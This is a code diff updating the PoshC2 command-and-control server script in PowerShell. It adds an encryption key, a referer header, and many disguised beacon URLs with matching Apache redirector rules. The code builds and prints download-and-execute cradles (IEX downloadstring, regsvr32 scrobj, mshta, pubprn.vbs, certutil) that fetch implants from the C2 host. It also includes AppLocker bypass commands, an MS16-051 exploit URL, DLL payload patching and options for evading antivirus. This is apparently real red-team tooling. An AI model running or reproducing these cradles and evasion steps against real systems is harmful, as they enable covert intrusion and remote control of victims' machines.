@@ -17,7 +17,7 @@ Write-Host -Object " |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/ "  -Fore
 Write-Host -Object " |    |  (  <_> )___ \|   Y  \ \     \____/       \ "  -ForegroundColor Green
 Write-Host -Object " |____|   \____/____  >___|  /  \______  /\_______ \"  -ForegroundColor Green
 Write-Host -Object "                    \/     \/          \/         \/"  -ForegroundColor Green
-Write-Host "=============== v3.0 www.PoshC2.co.uk =============" -ForegroundColor Green
+Write-Host "=============== v3.8 www.PoshC2.co.uk =============" -ForegroundColor Green
 Write-Host "" -ForegroundColor Green
 
 if (!$RestartC2Server) {
@@ -38,6 +38,32 @@ $ipv4address = $null
 $randomuriarray = @()
 $taskiddb = 1 
 $exe = $false
+Add-Type -TypeDefinition @"
+using System;
+using System.Text;
+using System.Runtime.InteropServices;
+
+public class FileClass
+{
+
+[DllImport("shlwapi", EntryPoint="PathSkipRoot")]
+public static extern IntPtr PathSkipRoot(IntPtr lpszSrc);
+
+public static string GetRoot(string Src) {
+    IntPtr cpyString = Marshal.StringToHGlobalAnsi(Src);
+    IntPtr pU = PathSkipRoot(cpyString);
+    string strName;
+    if (pU == IntPtr.Zero)
+        strName = null;
+    else
+        strName = Marshal.PtrToStringAnsi(pU);
+    Marshal.FreeHGlobal(cpyString);
+    return strName;
+}
+
+}
+
+"@
 
 # used to generate random uri for each implant
 function Get-RandomURI 
@@ -118,23 +144,13 @@ function Encrypt-String2
 }
 
 # decryption utility using Rijndael encryption, an AES equivelant, returns unencrypted bytes block 
-function Decrypt-String2 
-{
-    param
-    (
-        [Object]
-        $key,
-        [Object]
-        $encryptedStringWithIV
-    )
-    $bytes = $encryptedStringWithIV
-    $IV = $bytes[0..15]
-    $aesManaged = Create-AesManagedObject $key $IV
-    $decryptor = $aesManaged.CreateDecryptor()
-    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
-    $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
+function Decrypt-String2 ($key, $bytes) {
+	$IV = $bytes[0..15]
+	$aesManaged = Create-AesManagedObject $key $IV
+	$decryptor = $aesManaged.CreateDecryptor()
+	$byteArray = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
+    $output = (New-Object IO.StreamReader ($(New-Object System.IO.Compression.GzipStream ($(New-Object IO.MemoryStream (,$byteArray)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
     $output
-    #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
 }
 
 # encryption utility using Rijndael encryption, an AES equivelant, returns encrypted base64 block 
@@ -173,7 +189,20 @@ function Decrypt-String
     $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
     [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
 }
-
+function Decrypt-Bytes($key, $bytes) {
+	$IV = $bytes[0..15]
+	$aesManaged = Create-AesManagedObject $key $IV
+	$decryptor = $aesManaged.CreateDecryptor()
+	$byteArray = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
+	$input = New-Object System.IO.MemoryStream( , $byteArray ) 
+    $output = New-Object System.IO.MemoryStream
+	$gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
+	$gzipStream.CopyTo( $output )
+	$gzipStream.Close()
+	$input.Close()
+	[byte[]] $byteOutArray = $output.ToArray() 
+	$byteOutArray
+}
 # download file function to convert from base64 in db to file
 function Download-File
 {
@@ -239,30 +268,32 @@ function Resolve-PathSafe
 }
 
 function PatchDll {
-    param($dllBytes, $replaceString, $Arch)
+    param($dllBytes, $replaceString, $Arch, $offset)
+
 
     if ($Arch -eq 'x86') {
-        $dllOffset = 0x00012D80
+        $dllOffset = 0x00012F80
         #$dllOffset = 0x00012ED0 +8
     }
     if ($Arch -eq 'x64') {
-        $dllOffset = 0x00017100
+        $dllOffset = 0x00017300
+    }
+    if($offset) {
+        $dllOffset = $offset
     }
 
-    # Patch DLL - replace 5000 A's
-    $AAAA = "A"*5000
-    $AAAABytes = ([System.Text.Encoding]::UNICODE).GetBytes($AAAA)
+    # Patch DLL - replace 8000 A's
     $replaceStringBytes = ([System.Text.Encoding]::UNICODE).GetBytes($replaceString)
     
     # Length of replacement code
     $dllLength = $replaceString.Length
-    $patchLength = 5000 -$dllLength
+    $patchLength = 8000 -$dllLength
     $nullString = 0x00*$patchLength
     $nullBytes = ([System.Text.Encoding]::UNICODE).GetBytes($nullString)
     $nullBytes = $nullBytes[1..$patchLength]
     $replaceNewStringBytes = ($replaceStringBytes+$nullBytes)
 
-    $dllLength = 10000 -3
+    $dllLength = 16000 -2
     $i=0
     # Loop through each byte from start position
     $dllOffset..($dllOffset + $dllLength) | % {
@@ -286,6 +317,7 @@ if ($RestartC2Server)
     $c2serverresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
     $defaultbeacon = $c2serverresults.DefaultSleep
     $killdatefm = $c2serverresults.KillDate
+    $EncKey = $c2serverresults.EncKey
     $ipv4address = $c2serverresults.HostnameIP 
     $DomainFrontHeader = $c2serverresults.DomainFrontHeader 
     $serverport = $c2serverresults.ServerPort 
@@ -299,7 +331,12 @@ if ($RestartC2Server)
     $Socksurlstring = $c2serverresults.SocksURLS
     $Insecure = $c2serverresults.Insecure
     $useragent = $c2serverresults.UserAgent
+    $Referer = $c2serverresults.Referer
 
+    $downloadStub = $urlstring -split ","
+    $downloadStubURL = $downloadStub[1] -replace '"',''
+    $newImplant = $urlstring -split ","
+    $newImplantURL = $newImplant[0] -replace '"',''
     $Host.ui.RawUI.WindowTitle = "PoshC2 Server: $ipv4address Port $serverport"
 
     Write-Host `n"Listening on: $ipv4address Port $serverport (HTTP) | Kill date $killdatefm" `n -ForegroundColor Green
@@ -307,24 +344,24 @@ if ($RestartC2Server)
 
     write-host $shortcut `n -ForegroundColor green
     write-Host "For a more stealthy approach, use SubTee's hidden gems, NOTE: These do not work with untrusted SSL certificates if using over HTTPS:"
-    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
-    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`"" -ForegroundColor green
-    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`")(window.close)" -ForegroundColor green
+    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_rg scrobj.dll" -ForegroundColor green
+    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_cs`"" -ForegroundColor green
+    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_cs`")(window.close)" -ForegroundColor green
     write-host ""
     write-Host "Or use Forshaw's DotNetToJS to obtain execution, NOTE: This does not work with untrusted SSL certificates if using over HTTPS:"
-    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_js`")(window.close)" -ForegroundColor green
-    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_js`"" -ForegroundColor green
+    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_js`")(window.close)" -ForegroundColor green
+    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_js`"" -ForegroundColor green
     write-host ""
     write-Host "To Bypass AppLocker or equivalent, use InstallUtil.exe or Regasm:"
     write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $global:newdir\payloads\posh.exe" -ForegroundColor green
     write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U $global:newdir\payloads\posh.exe" -ForegroundColor green
     write-host ""
     write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
-    write-host "$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_ms16-051" -ForegroundColor green
+    write-host "$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_ms16-051" -ForegroundColor green
     write-host ""
     write-Host "To download PoshC2 InstallUtil/General executable use the following URL:"
-    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_df`"" -ForegroundColor green
-    write-host "certutil -urlcache -split -f $($ipv4address):$($serverport)/webapp/static/$($downloaduri)_iu %temp%\\$($downloaduri)_iu" -ForegroundColor green
+    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_df`"" -ForegroundColor green
+    write-host "certutil -urlcache -split -f $($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_iu %temp%\\$($downloaduri)_iu" -ForegroundColor green
     write-host ""
 
     #launch a new powershell session with the implant handler running
@@ -333,7 +370,12 @@ if ($RestartC2Server)
     foreach ($task in $taskscompleted) {
     $resultsdb = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks WHERE CompletedTaskID=$task" -as PSObject
     $ranuri = $resultsdb.RandomURI
-    $implanthost = Invoke-SqliteQuery -DataSource $Database -Query "SELECT User FROM Implants WHERE RandomURI='$ranuri'" -as SingleValue
+    $implantResults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE RandomURI='$ranuri'" -as PSObject
+    $implanthost = $implantResults.User
+    $impHost = $implantResults.Hostname
+    $impID = $implantResults.ImplantID
+    $impDom = $implantResults.Domain
+
     if ($resultsdb)
     {
         if ($resultsdb.Command.tolower().startswith('get-screenshot')) {}
@@ -341,9 +383,10 @@ if ($RestartC2Server)
         elseif  ($resultsdb.Command.tolower().startswith('download-file')) {}
         else 
         {
-            Write-Host "Command Issued @" $resultsdb.TaskID "Against Host" $implanthost -ForegroundColor Green
-            Write-Host -Object $resultsdb.Command -ForegroundColor Red
-            Write-Host -Object $resultsdb.Output
+            $Tasktime = $resultsdb.TaskID
+            Write-Host "Command issued against implant $impID on host $impHost $impDom ($TaskTime)" -ForegroundColor Yellow
+            Write-Host -Object $resultsdb.Command -ForegroundColor Green
+            Write-Host -Object $resultsdb.Output -ForegroundColor Green
         }
         $taskiddb ++
     }
@@ -477,10 +520,15 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
     
     $apache = @"
 RewriteEngine On
+SSLProxyEngine On
+SSLProxyCheckPeerCN Off
+SSLProxyVerify none
+SSLProxyCheckPeerName off
+SSLProxyCheckPeerExpire off
+
 Define PoshC2 <ADD_IPADDRESS_HERE>
 Define SharpSocks <ADD_IPADDRESS_HERE>
-RewriteRule ^/webapp/static(.*) $uri`${PoshC2}/webapp/static`$1 [NC,P]
-RewriteRule ^/connect(.*) $uri`${PoshC2}/connect`$1 [NC,P]
+
 "@
     $customurldef = "No"
     $customurl = Read-Host -Prompt "[3a] Do you want to customize the beacon URLs from the default? [No]"
@@ -489,26 +537,49 @@ RewriteRule ^/connect(.*) $uri`${PoshC2}/connect`$1 [NC,P]
         $urls = @()
         do {
             $input = (Read-Host "Please enter the URLs you want to use, enter blank entry to finish: images/site/content")
-            if ($input -ne '') {$urls += "`"$input`""; $apache += "`nRewriteRule ^/$input(.*) $uri`${PoshC2}/$input`$1 [NC,P]"}
+            if ($input -ne '') {$urls += "`"$input`""; $apache += "`nRewriteRule ^/$input(.*) $uri`${PoshC2}/$input`$1 [NC,L,P]"}
         }
         until ($input -eq '')
         [string]$urlstring = $null
         $urlstring = $urls -join ","
     } else {
-        $urlstring = '"images/static/content/","news/id=","webapp/static/","images/prints/","wordpress/site/","steam/","true/images/77/static/","holdings/office/images/"'
+        $urlstring = '"images/static/content/","news/","webapp/static/","images/prints/","wordpress/site/","steam/connect/","true/images/static/","holdings/office/images/","preferences/site/","okfn/website/blob/master/templates/","forums/review/","general/community/mega/","organisations/space/value/","trigger/may/","web/master/review/","premium/gov/pop/","usc/builder/power/master/","shopping/v/awe/pool/app/a/","pl/en/pages/","store/en/uk/pages/","plugins/domains/custom/uk/","gas/safe/register/","online/free/advice/","cookies/websites/content/","free/uk/shopping/unlimited/"'
             $apache = @"
 RewriteEngine On
+SSLProxyEngine On
+SSLProxyCheckPeerCN Off
+SSLProxyVerify none
+SSLProxyCheckPeerName off
+SSLProxyCheckPeerExpire off
+
 Define PoshC2 <ADD_IPADDRESS_HERE>
 Define SharpSocks <ADD_IPADDRESS_HERE>
-RewriteRule ^/connect(.*) $uri`${PoshC2}/connect`$1 [NC,P]
-RewriteRule ^/images/static/content/(.*) $uri`${PoshC2}/images/static/content/`$1 [NC,P]
-RewriteRule ^/news/(.*) $uri`${PoshC2}/news/`$1 [NC,P]
-RewriteRule ^/webapp/static/(.*) $uri`${PoshC2}/webapp/static/`$1 [NC,P]
-RewriteRule ^/images/prints/(.*) $uri`${PoshC2}/images/prints/`$1 [NC,P]
-RewriteRule ^/wordpress/site/(.*) $uri`${PoshC2}/wordpress/site/`$1 [NC,P]
-RewriteRule ^/true/images/77/(.*) $uri`${PoshC2}/true/images/77/`$1 [NC,P]
-RewriteRule ^/holdings/office/images/(.*) $uri`${PoshC2}/holdings/office/images/`$1 [NC,P]
-RewriteRule ^/steam(.*) $uri`${PoshC2}/steam`$1 [NC,P]
+
+RewriteRule ^/images/static/content/(.*) $uri`${PoshC2}/images/static/content/`$1 [NC,L,P]
+RewriteRule ^/news/(.*) $uri`${PoshC2}/news/`$1 [NC,L,P]
+RewriteRule ^/webapp/static/(.*) $uri`${PoshC2}/webapp/static/`$1 [NC,L,P]
+RewriteRule ^/images/prints/(.*) $uri`${PoshC2}/images/prints/`$1 [NC,L,P]
+RewriteRule ^/wordpress/site/(.*) $uri`${PoshC2}/wordpress/site/`$1 [NC,L,P]
+RewriteRule ^/true/images/(.*) $uri`${PoshC2}/true/images/`$1 [NC,L,P]
+RewriteRule ^/holdings/office/images/(.*) $uri`${PoshC2}/holdings/office/images/`$1 [NC,L,P]
+RewriteRule ^/steam/connect/(.*) $uri`${PoshC2}/steam/connect/`$1 [NC,L,P]
+RewriteRule ^/preferences/site/(.*) $uri`${PoshC2}/preferences/site/`$1 [NC,L,P]
+RewriteRule ^/okfn/website/blob/master/templates/(.*) $uri`${PoshC2}/okfn/website/blob/master/templates/`$1 [NC,L,P]
+RewriteRule ^/forums/review/(.*) $uri`${PoshC2}/forums/review/`$1 [NC,L,P]
+RewriteRule ^/general/community/mega/(.*) $uri`${PoshC2}/general/community/mega/`$1 [NC,L,P]
+RewriteRule ^/organisations/space/value/(.*) $uri`${PoshC2}/organisations/space/value/`$1 [NC,L,P]
+RewriteRule ^/trigger/may/(.*) $uri`${PoshC2}/trigger/may/`$1 [NC,L,P]
+RewriteRule ^/web/master/review/(.*) $uri`${PoshC2}/web/master/review/`$1 [NC,L,P]
+RewriteRule ^/premium/gov/pop/(.*) $uri`${PoshC2}/premium/gov/pop/`$1 [NC,L,P]
+RewriteRule ^/usc/builder/power/master/(.*) $uri`${PoshC2}/usc/builder/power/master/`$1 [NC,L,P]
+RewriteRule ^/shopping/v/awe/pool/app/a/(.*) $uri`${PoshC2}/shopping/v/awe/pool/app/a/`$1 [NC,L,P]
+RewriteRule ^/pl/en/pages/(.*) $uri`${PoshC2}/pl/en/pages/`$1 [NC,L,P]
+RewriteRule ^/store/en/uk/pages/(.*) $uri`${PoshC2}/store/en/uk/pages/`$1 [NC,L,P]
+RewriteRule ^/plugins/domains/custom/uk/(.*) $uri`${PoshC2}/plugins/domains/custom/uk/`$1 [NC,L,P]
+RewriteRule ^/gas/safe/register/(.*) $uri`${PoshC2}/gas/safe/register/`$1 [NC,L,P]
+RewriteRule ^/online/free/advice/(.*) $uri`${PoshC2}/online/free/advice/`$1 [NC,L,P]
+RewriteRule ^/cookies/websites/content/(.*) $uri`${PoshC2}/cookies/websites/content/`$1 [NC,L,P]
+RewriteRule ^/free/uk/shopping/unlimited/(.*) $uri`${PoshC2}/free/uk/shopping/unlimited/`$1 [NC,L,P]
 "@
     }
 
@@ -528,25 +599,35 @@ RewriteRule ^/steam(.*) $uri`${PoshC2}/steam`$1 [NC,P]
         $socksurlstring = '"sitemap/api/push","visitors/upload/map","printing/images/bin/logo","update/latest/traffic","saml/stats/update/push"'
         $apache += @"
 
-RewriteRule ^/sitemap/api/push(.*) $uri`${SharpSocks}/sitemap/api/push`$1 [NC,P]
-RewriteRule ^/visitors/upload/map(.*) $uri`${SharpSocks}/visitors/upload/map`$1 [NC,P]
-RewriteRule ^/printing/images/bin/logo(.*) $uri`${SharpSocks}/printing/images/bin/logo`$1 [NC,P]
-RewriteRule ^/update/latest/traffic(.*) $uri`${SharpSocks}/update/latest/traffic`$1 [NC,P]
-RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/push`$1 [NC,P]
+RewriteRule ^/sitemap/api/push(.*) $uri`${SharpSocks}/sitemap/api/push`$1 [NC,L,P]
+RewriteRule ^/visitors/upload/map(.*) $uri`${SharpSocks}/visitors/upload/map`$1 [NC,L,P]
+RewriteRule ^/printing/images/bin/logo(.*) $uri`${SharpSocks}/printing/images/bin/logo`$1 [NC,L,P]
+RewriteRule ^/update/latest/traffic(.*) $uri`${SharpSocks}/update/latest/traffic`$1 [NC,L,P]
+RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/push`$1 [NC,L,P]
 "@
     }
 
     $customuseragentdef = "No"
-    $customuseragent = Read-Host -Prompt "[4] Do you want to customize the default UserAgent? [No]"
+    $customuseragent = Read-Host -Prompt "[4a] Do you want to customize the default UserAgent? [No]"
     $customuseragent = ($customuseragentdef,$customuseragent)[[bool]$customuseragent]
 
     if ($customuseragent -eq "Yes") {
         $useragent = (Read-Host "Please enter the UserAgent you want to use: ")
     } else {
-        $useragent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)"
+        $useragent = "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko"
     }
 
-    $global:newdir = 'PoshC2-'+(get-date -Format yyy-dd-MM-HHmm)
+    $customreferer = "No"
+    $customuseragent = Read-Host -Prompt "[4b] Do you want to a referer header? [No]"
+    $customuseragent = ($customuseragentdef,$customuseragent)[[bool]$customuseragent]
+
+    if ($customuseragent -eq "Yes") {
+        $referer = (Read-Host "Please enter the Referer you want to use: ")
+    } else {
+        $referer = ""
+    }
+
+    $global:newdir = 'PoshC2-'+(get-date -Format yyy-MM-dd-HHmm)
     $prompt = Read-Host -Prompt "[5] Enter a new folder name for this project [$($global:newdir)]"
     $tempdir= ($global:newdir,$prompt)[[bool]$prompt]
     $RootFolder = $PoshPath.TrimEnd("PowershellC2\")
@@ -597,12 +678,16 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
     $enablepayloads = "Yes"
     $prompt = Read-Host -Prompt "[11] Do you want all payloads or select limited payloads that shouldnt be caught by AV? [$($enablepayloads)]"
     $enablepayloads = ($enablepayloads,$prompt)[[bool]$prompt]
-    
+    $downloadStub = $urlstring -split ","
+    $downloadStubURL = $downloadStub[1] -replace '"',''
+    $newImplant = $urlstring -split ","
+    $newImplantURL = $newImplant[0] -replace '"',''
+
     $downloaduri = Get-RandomURI -Length 5
     if ($ipv4address.Contains("https")) {
-        $shortcut = "powershell -exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/webapp/static/$($downloaduri)')"+'"'+"" 
+        $shortcut = "powershell -exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)')"+'"'+"" 
     } else {
-        $shortcut = "powershell -exec bypass -c "+'"'+"IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/webapp/static/$($downloaduri)')"+'"'+""     
+        $shortcut = "powershell -exec bypass -c "+'"'+"IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)')"+'"'+""     
     }
 
     $httpresponse = '
@@ -616,6 +701,9 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
 <address>Apache (Debian) Server</address>
 </body></html>
     '
+
+    $EncKey = Create-AesKey
+
     New-Item $global:newdir -Type directory | Out-Null
     New-Item $global:newdir\downloads -Type directory | Out-Null
     New-Item $global:newdir\reports -Type directory | Out-Null
@@ -676,6 +764,7 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
     $Query = 'CREATE TABLE C2Server (
         ID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
         HostnameIP TEXT,
+        EncKey TEXT,
         DomainFrontHeader TEXT,
         DefaultSleep TEXT,
         KillDate TEXT,
@@ -693,7 +782,8 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
         URLS TEXT,
         SocksURLS TEXT,
         Insecure TEXT,
-        UserAgent TEXT)'
+        UserAgent TEXT,
+        Referer TEXT)'
 
     Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null
 
@@ -703,13 +793,14 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
 
     Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null
 
-    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, DomainFrontHeader, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI, Sounds, APIKEY, MobileNumber, URLS, SocksURLS, Insecure, UserAgent)
-            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @DomainFrontHeader, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI, @Sounds, @APIKEY, @MobileNumber, @URLS, @SocksURLS, @Insecure, @UserAgent)'
+    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, EncKey, DomainFrontHeader, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI, Sounds, APIKEY, MobileNumber, URLS, SocksURLS, Insecure, UserAgent, Referer)
+            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @EncKey, @DomainFrontHeader, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI, @Sounds, @APIKEY, @MobileNumber, @URLS, @SocksURLS, @Insecure, @UserAgent, @Referer)'
 
     Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
         DefaultSleep = $defaultbeacon
         KillDate = $killdatefm
         HostnameIP  = $ipv4address
+        EncKey  = $EncKey
         DomainFrontHeader  = $domainfrontheader
         HTTPResponse = $httpresponse
         FolderPath = $global:newdir
@@ -723,9 +814,11 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
         SocksURLS = $socksurlstring
         Insecure = $Insecure
         UserAgent = $useragent
+        Referer = $Referer
     } | Out-Null
 
     $Host.ui.RawUI.WindowTitle = "PoshC2 Server: $ipv4address Port $serverport"
+    Write-Host `n"PoshC2 Unique Encryption Key: $EncKey"
 
     Write-Host `n"Apache rewrite rules written to: $global:newdir\apache.conf" -ForegroundColor Green
     Out-File -InputObject $apache -Encoding ascii -FilePath "$global:newdir\apache.conf"
@@ -735,24 +828,24 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
 
     write-host $shortcut `n -ForegroundColor green
     write-Host "For a more stealthy approach, use SubTee's hidden gems, NOTE: These do not work with untrusted SSL certificates if using over HTTPS:"
-    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
-    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`"" -ForegroundColor green
-    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`")(window.close)" -ForegroundColor green
+    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_rg scrobj.dll" -ForegroundColor green
+    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_cs`"" -ForegroundColor green
+    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_cs`")(window.close)" -ForegroundColor green
     write-host ""
     write-Host "Or use Forshaw's DotNetToJS to obtain execution, NOTE: This does not work with untrusted SSL certificates if using over HTTPS:"
-    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_js`")(window.close)" -ForegroundColor green
-    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_js`"" -ForegroundColor green
+    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_js`")(window.close)" -ForegroundColor green
+    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_js`"" -ForegroundColor green
     write-host ""
     write-Host "To Bypass AppLocker or equivalent, use InstallUtil.exe or Regasm:"
     write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $global:newdir\payloads\posh.exe" -ForegroundColor green
     write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U $global:newdir\payloads\posh.exe" -ForegroundColor green
     write-host ""
     write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
-    write-host "$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_ms16-051" -ForegroundColor green
+    write-host "$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_ms16-051" -ForegroundColor green
     write-host ""
     write-Host "To download PoshC2 InstallUtil/General executable use the following URL:"
-    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_df`"" -ForegroundColor green
-    write-host "certutil -urlcache -split -f $($ipv4address):$($serverport)/webapp/static/$($downloaduri)_iu %temp%\\$($downloaduri)_iu" -ForegroundColor green
+    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_df`"" -ForegroundColor green
+    write-host "certutil -urlcache -split -f $($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_iu %temp%\\$($downloaduri)_iu" -ForegroundColor green
     write-host ""
 
     # call back command
@@ -763,9 +856,9 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
     
     Import-Module $PoshPath\C2-Payloads.ps1 
     if ($Insecure -eq "YES") {
-        $command = createdropper -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -useragent $useragent -Insecure
+        $command = createdropper -enckey $enckey -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -useragent $useragent -Insecure -Referer $Referer
     } else {
-        $command = createdropper -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -useragent $useragent
+        $command = createdropper -enckey $enckey -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -useragent $useragent -Referer $Referer
     }
     $payload = createrawpayload -command $command
 
@@ -793,7 +886,6 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
         cs_sct
         df_sct
     }
-
     
     #launch a new powershell session with the implant handler running
     Start-Process -FilePath powershell.exe -ArgumentList " -NoP -Command import-module $PoshPath\Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir' -PoshPath '$PoshPath'"
@@ -866,12 +958,18 @@ while ($listener.IsListening)
     $message = $null
     $context = $listener.GetContext() # blocks until request is received
     $request = $context.Request
-    $response = $context.Response       
-    if ($request.Url -match "/webapp/static/$($downloaduri)$") 
+    $response = $context.Response
+    
+    $downloadStub = $urlstring -split ","
+    $downloadStubURL = $downloadStub[1] -replace '"',''
+    $newImplant = $urlstring -split ","
+    $newImplantURL = $newImplant[0] -replace '"',''
+       
+    if ($request.Url -match "$($downloadStubURL)$($downloaduri)$") 
     {
         $message = $payload
     }
-    if ($request.Url -match "/webapp/static/$($downloaduri)_ms16-051$")
+    if ($request.Url -match "$($downloadStubURL)$($downloaduri)_ms16-051$")
     {
